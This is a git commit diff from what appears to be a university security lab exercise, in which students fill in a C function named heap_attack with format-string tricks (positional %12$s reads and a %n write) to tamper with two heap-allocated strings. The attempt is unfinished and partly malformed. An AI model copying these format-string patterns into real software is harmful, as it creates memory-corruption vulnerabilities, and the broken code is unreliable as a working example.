9b1e9bbaf3134c73c562082caaf727ffc05aca5f
Hiddentale <55276630+Hiddentale@users.noreply.github.com>
2024-09-27 19:41:40 +0200

    Almost done, trying to figure out how to inject code with %n

--- week3/hic-assignment3-s4816587-s1049496/exercise5.c
+++ week3/hic-assignment3-s4816587-s1049496/exercise5.c
@@ -1,24 +1,32 @@
-// vim: shiftwidth=4 tabstop=4 softtabstop=4 noexpandtab
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
 
-void heap_attack(void) {
-	// ...
+void heap_attack(void) { //https://axcheron.github.io/exploit-101-format-strings/
+	char buffer[17];
+
+	int s1_index = 12;
+	int offset = s1_index * sizeof(unsigned long);
+	
+	snprintf(buffer, sizeof(buffer), "%*c%$n", offset - 1);
+	printf("s1: %12$s\n\n");
+	printf("s2: %13$s\n\n");
+
 }
 
 int main(void) {
-	char *s1 = malloc(9);
+	char* s1 = malloc(9);
 	if (s1 == NULL) { return 1; }
-	char *s2 = malloc(9);
+	char* s2 = malloc(9);
 	if (s2 == NULL) { return 1; }
 
-	strcpy(s1, "s0123456");
-	strcpy(s2, "s3456789");
+
+	strcpy(s1, "s4816587");
+	strcpy(s2, "s1234567");
 
 	heap_attack();
 
-	printf("student 1: %s\n", s1);
+	printf("student 1: %s\n", s1); 
 	printf("student 2: %s\n", s2);
 	return 0;
 }
